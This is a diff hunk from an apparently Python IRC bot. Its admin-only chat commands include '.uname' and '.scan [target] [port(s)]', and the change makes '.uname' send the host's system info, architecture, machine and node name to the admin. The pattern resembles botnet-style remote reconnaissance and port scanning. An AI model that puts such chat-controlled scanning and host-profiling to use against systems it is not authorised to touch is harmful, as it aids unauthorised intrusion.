@@ -368,7 +368,13 @@ def main():
                     
                 # Respond to '.uname' command from admin.
                 if name.lower() == adminname.lower() and message.find('.uname') != -1:
-                    sendmsg("System Info: " + format(uname()), name)
+                    sendmsg("System Info: " + format(uname()), adminname)
+                    # Architecture
+                    sendmsg("Architecture: " + format(platform.architecture()[0]), adminname)
+                    # machine
+                    sendmsg("Machine: " + format(platform.machine()), adminname)
+                    # node
+                    sendmsg("Node: " + format(platform.node()), adminname)
 
                 # Respond to '.scan [target] [port(s)]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.scan') != -1:
